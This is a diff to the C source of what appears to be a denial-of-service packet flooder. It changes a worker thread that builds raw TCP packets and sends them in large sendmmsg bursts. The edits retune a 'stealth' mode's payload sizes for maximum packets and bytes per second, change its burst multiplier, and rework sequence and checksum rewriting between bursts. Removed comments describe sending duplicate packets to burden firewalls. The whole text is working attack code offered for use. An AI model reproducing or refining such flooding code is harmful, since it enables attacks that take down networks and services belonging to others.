@@ -2270,10 +2270,9 @@ void *worker_thread(void *arg) {
                     // 2. Multi-payload: alternate PPS/balanced/BPS per round
                     unsigned int raw_pl;
                     if (stealth) {
-                        unsigned int pl_mode = round % 3;
-                        if (pl_mode == 0) raw_pl = 64 + (fast_rand() % 192);       // 64-256: MAX PPS
-                        else if (pl_mode == 1) raw_pl = 512 + (fast_rand() % 488); // 512-1000: balanced
-                        else raw_pl = 1000 + (fast_rand() % 440);                  // 1000-1440: MAX BPS
+                        unsigned int pl_mode = round % 5;
+                        if (pl_mode == 0) raw_pl = 256 + (fast_rand() % 256);       // 256-512: PPS burst
+                        else raw_pl = 1000 + (fast_rand() % 440);                   // 1000-1440: BPS (80% of rounds)
                     } else {
                         raw_pl = 1000 + (fast_rand() % 440);
                     }
@@ -2346,7 +2345,7 @@ void *worker_thread(void *arg) {
             // 128x burst, dual socket, skip checksum between bursts
             int cur_fd = fd_send;
             unsigned long long total_sent = 0, total_bytes = 0;
-            int burst_count = stealth ? 2048 : 256; // stealth: 8x burst power for max PPS
+            int burst_count = stealth ? 768 : 256; // stealth: 3x burst power
             for(int burst = 0; burst < burst_count; burst++) {
                 int sent=sendmmsg(cur_fd,vmsg_active,valid_pkts,0);
                 if(sent>0){
@@ -2361,61 +2360,43 @@ void *worker_thread(void *arg) {
                     else break;
                 }
                 
-                // Stealth: skip seq update between bursts for 2x PPS
-                // Duplicate packets force FW to handle retransmission logic → extra CPU
-                if (!stealth) {
-                    // Update seq/checksum for the NEXT burst to avoid duplicate sequence numbers
-                    for(int i = 0; i < valid_pkts; i++) {
-                        struct iphdr *bih;
-                        struct tcphdr *bth;
-                        unsigned char *bfr = (unsigned char*)vmsg_active[i].msg_hdr.msg_iov->iov_base;
-                        unsigned short old_seq_hi, old_seq_lo, old_ipid, old_ip_check, old_tcp_check;
-                        unsigned int new_seq;
-                        unsigned short new_seq_hi, new_seq_lo;
-                        unsigned int ip_diff, ip_ck, tcp_diff, tcp_ck;
+                // Update seq/checksum for NEXT burst (all modes)
+                for(int i = 0; i < valid_pkts; i++) {
+                    struct iphdr *bih;
+                    struct tcphdr *bth;
+                    unsigned char *bfr = (unsigned char*)vmsg_active[i].msg_hdr.msg_iov->iov_base;
+                    unsigned short old_seq_hi, old_seq_lo, old_ipid, old_ip_check, old_tcp_check;
+                    unsigned int new_seq;
+                    unsigned short new_seq_hi, new_seq_lo;
+                    unsigned int ip_diff, ip_ck, tcp_diff, tcp_ck;
 
-                        if(use_afp) { bih=(struct iphdr*)(bfr+V17ETH); bth=(struct tcphdr*)(bfr+V17ETH+V17IP); }
-                        else { bih=(struct iphdr*)bfr; bth=(struct tcphdr*)(bfr+V17IP); }
-                        
-                        old_seq_hi = ((unsigned short*)&bth->seq)[0];
-                        old_seq_lo = ((unsigned short*)&bth->seq)[1];
-                        old_ipid = bih->id;
-                        old_ip_check = bih->check;
-                        old_tcp_check = bth->check;
-                        
-                        unsigned int p_len = ntohs(bih->tot_len) - V17IP - (bth->doff * 4);
-                        new_seq = ntohl(bth->seq) + p_len;
-                        bth->seq = htonl(new_seq);
-                        bih->id = htons(ntohs(bih->id) + 1);
-                        
-                        new_seq_hi = ((unsigned short*)&bth->seq)[0];
-                        new_seq_lo = ((unsigned short*)&bth->seq)[1];
-                        
-                        ip_diff = (~old_ipid & 0xFFFF) + (bih->id & 0xFFFF);
-                        ip_ck = (~old_ip_check & 0xFFFF) + ip_diff;
-                        ip_ck = (ip_ck >> 16) + (ip_ck & 0xFFFF); ip_ck += (ip_ck >> 16);
-                        bih->check = (unsigned short)~ip_ck;
-                        
-                        tcp_diff = (~old_seq_hi & 0xFFFF) + (new_seq_hi & 0xFFFF)
-                                              + (~old_seq_lo & 0xFFFF) + (new_seq_lo & 0xFFFF);
-                        tcp_ck = (~old_tcp_check & 0xFFFF) + tcp_diff;
-                        tcp_ck = (tcp_ck >> 16) + (tcp_ck & 0xFFFF); tcp_ck += (tcp_ck >> 16);
-                        bth->check = (unsigned short)~tcp_ck;
-                    }
-                } else {
-                    // Stealth: only update IP ID (cheap) — skip seq for raw speed
-                    for(int i = 0; i < valid_pkts; i++) {
-                        struct iphdr *bih;
-                        unsigned char *bfr = (unsigned char*)vmsg_active[i].msg_hdr.msg_iov->iov_base;
-                        if(use_afp) bih=(struct iphdr*)(bfr+V17ETH);
-                        else bih=(struct iphdr*)bfr;
-                        unsigned short old_ipid = bih->id;
-                        bih->id = htons(ntohs(bih->id) + 1);
-                        unsigned int ip_diff = (~old_ipid & 0xFFFF) + (bih->id & 0xFFFF);
-                        unsigned int ip_ck = (~bih->check & 0xFFFF) + ip_diff;
-                        ip_ck = (ip_ck >> 16) + (ip_ck & 0xFFFF); ip_ck += (ip_ck >> 16);
-                        bih->check = (unsigned short)~ip_ck;
-                    }
+                    if(use_afp) { bih=(struct iphdr*)(bfr+V17ETH); bth=(struct tcphdr*)(bfr+V17ETH+V17IP); }
+                    else { bih=(struct iphdr*)bfr; bth=(struct tcphdr*)(bfr+V17IP); }
+                    
+                    old_seq_hi = ((unsigned short*)&bth->seq)[0];
+                    old_seq_lo = ((unsigned short*)&bth->seq)[1];
+                    old_ipid = bih->id;
+                    old_ip_check = bih->check;
+                    old_tcp_check = bth->check;
+                    
+                    unsigned int p_len = ntohs(bih->tot_len) - V17IP - (bth->doff * 4);
+                    new_seq = ntohl(bth->seq) + p_len;
+                    bth->seq = htonl(new_seq);
+                    bih->id = htons(ntohs(bih->id) + 1);
+                    
+                    new_seq_hi = ((unsigned short*)&bth->seq)[0];
+                    new_seq_lo = ((unsigned short*)&bth->seq)[1];
+                    
+                    ip_diff = (~old_ipid & 0xFFFF) + (bih->id & 0xFFFF);
+                    ip_ck = (~old_ip_check & 0xFFFF) + ip_diff;
+                    ip_ck = (ip_ck >> 16) + (ip_ck & 0xFFFF); ip_ck += (ip_ck >> 16);
+                    bih->check = (unsigned short)~ip_ck;
+                    
+                    tcp_diff = (~old_seq_hi & 0xFFFF) + (new_seq_hi & 0xFFFF)
+                                          + (~old_seq_lo & 0xFFFF) + (new_seq_lo & 0xFFFF);
+                    tcp_ck = (~old_tcp_check & 0xFFFF) + tcp_diff;
+                    tcp_ck = (tcp_ck >> 16) + (tcp_ck & 0xFFFF); tcp_ck += (tcp_ck >> 16);
+                    bth->check = (unsigned short)~tcp_ck;
                 }
             }
             thread_stats[tid].packets     += total_sent;
